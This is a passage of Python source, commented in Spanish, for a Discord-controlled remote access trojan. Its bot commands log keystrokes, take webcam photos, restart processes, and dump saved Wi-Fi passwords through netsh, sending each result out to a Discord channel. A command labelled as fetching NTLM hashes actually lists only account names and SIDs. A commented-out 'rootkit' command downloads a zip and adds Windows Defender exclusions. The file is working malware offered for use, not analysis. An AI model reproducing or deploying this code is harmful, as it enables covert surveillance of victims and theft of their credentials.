        keyboard.hook(on_key_event)

        # Temporizador en segundo plano
        def timer():
            time.sleep(seconds)
            stop_event.set()

        timer_threads = threading.Thread(target=timer)
        timer_threads.start()

        # Esperar mientras se registran las teclas
        while not stop_event.is_set():
            await asyncio.sleep(1)

        # Detener el keylogger
        keyboard.unhook_all()
        timer_threads.join()

        # Procesar el registro
        if not log:
            await ctx.send("⚠ No se registraron pulsaciones.")
            return

        # Limitar el tamaño del log (Discord tiene límite de 2000 caracteres)
        log_text = " ".join(log[-500:])  # Últimas 500 teclas
        if len(log) > 500:
            log_text = f"... (últimas 500 de {len(log)} teclas)\n{log_text}"

        # Enviar como archivo si es muy largo
        if len(log_text) > 1500:
            with open("keylog.txt", "w") as f:
                f.write("Registro de teclas:\n" + " ".join(log))
            await ctx.send(file=discord.File("keylog.txt"))
            os.remove("keylog.txt")
        else:
            await ctx.send(f"**Registro de teclas ({seconds}s):**\n```\n{log_text}\n```")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command()
async def webcampic(ctx):
    try:
        # Usamos la cámara 0 por defecto
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            await ctx.send("No camera found.")
            return
        
        ret, frame = cap.read()
        if ret:
            # Guardar la foto tomada en el disco
            image_path = "webcam_picture.jpg"
            cv2.imwrite(image_path, frame)
            
            # Enviar la imagen a Discord como archivo adjunto
            await ctx.send("Picture taken successfully!", file=discord.File(image_path))
        else:
            await ctx.send("Failed to capture image.")
        cap.release()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

"""@bot.command()
async def rootkit(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Por favor, adjunte el archivo .zip a la mensaje.")
        return

    zip_file = ctx.message.attachments[0].filename
    zip_file_url = ctx.message.attachments[0].url

    rootkit_folder = "rootkit"
    rootkit_path = os.path.join(os.path.expanduser("~"), rootkit_folder)
    if not os.path.exists(rootkit_path):
        os.makedirs(rootkit_path)

    def ignore_windows_defender(folder_path):
        def add_exclusion(exclusion):
            subprocess.run(["powershell", "-Command", f"Set-MpPreference -ExclusionPath {exclusion}"])

        rootkit_path = os.path.abspath(folder_path)
        add_exclusion(rootkit_path)
        for parent, _, files in os.walk(rootkit_path):
            for file in files:
                file_path = os.path.join(parent, file)
                add_exclusion(file_path)

    def download_zip(url, file_path):
        with requests.get(url, stream=True) as r:
            with open(file_path, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)

    download_zip(zip_file_url, os.path.join(rootkit_path, zip_file))
    with zipfile.ZipFile(os.path.join(rootkit_path, zip_file), "r") as zip_ref:
        zip_ref.extractall(rootkit_path)
    await ctx.send("Rootkit creado con exito")"""

# Comando: Migrar un proceso a un nuevo proceso
@bot.command()
async def migrateprocess(ctx, process_name: str):
    try:
        # Buscar todos los procesos con el nombre indicado
        migrated_process = None
        for proc in psutil.process_iter(['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                migrated_process = proc
                break

        if migrated_process is None:
            await ctx.send(f"**Error:** No se encontró un proceso con el nombre `{process_name}` en ejecución.")
            return
        
        # Obtener la ruta del ejecutable del proceso encontrado
        process_path = migrated_process.exe()
        
        # Ejecutar una nueva instancia del proceso
        subprocess.Popen([process_path])
        await ctx.send(f"**Éxito:** Se ha migrado el proceso `{process_name}` a un nuevo proceso.")
        
        # Finalizar el proceso original (cerrar el primer proceso)
        migrated_process.terminate()
        time.sleep(2)  # Esperar un momento para asegurarse de que el proceso se termine
        
        await ctx.send(f"**El proceso original `{process_name}` ha sido cerrado y migrado.**")
    
    except Exception as e:
        await ctx.send(f"**Error:** {str(e)}")

# Comando: Para dumpear contraseñas de Wi-Fi
@bot.command()
async def password(ctx):
    try:
        # Ejecutar el comando PowerShell para obtener las redes Wi-Fi guardadas y sus contraseñas
        result = subprocess.run(
            ["powershell.exe", "netsh wlan show profiles"],
            capture_output=True, text=True
        )
        
        # Extraer las contraseñas de las redes Wi-Fi
        wifi_profiles = result.stdout.splitlines()
        wifi_passwords = []
        
        for line in wifi_profiles:
            if "All User Profile" in line:
                profile_name = line.split(":")[1].strip()
                # Obtener la contraseña de cada red Wi-Fi (si está disponible)
                password_result = subprocess.run(
                    ["powershell.exe", f"netsh wlan show profile name=\"{profile_name}\" key=clear"],
                    capture_output=True, text=True
                )
                password_info = password_result.stdout
                for line in password_info.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        wifi_passwords.append(f"**{profile_name}**: {password}")
                        break
        
        if not wifi_passwords:
            await ctx.send("No se encontraron contraseñas Wi-Fi guardadas o no hay contraseñas disponibles.")
        else:
            # Enviar las contraseñas encontradas al canal de Discord
            await ctx.send(f"**Contraseñas Wi-Fi encontradas:**\n" + "\n".join(wifi_passwords))
    
    except Exception as e:
        await ctx.send(f"Error al intentar obtener las contraseñas Wi-Fi: {str(e)}")

#Comando: Obtener hashes NTLM de las cuentas de usuario
@bot.command()
async def infocounts(ctx):
    try:
        # Obtener los hashes NTLM de las cuentas de usuario
        # Usamos el comando PowerShell Get-WmiObject para obtener detalles de las cuentas
        user_info_result = subprocess.run(
            ["powershell.exe", "Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID"],
            capture_output=True, text=True
        )
        
        # Mostrar los hashes NTLM para las cuentas
        user_info = user_info_result.stdout.strip()

        # Respuesta en Discord
        await ctx.send(f"**Info de las cuentas del sistema:**\n{user_info}")
    
    except Exception as e:
        await ctx.send(f"**Error al intentar obtener información:** {str(e)}")
          
#Ejecutar el bot
bot.run(bot_token)
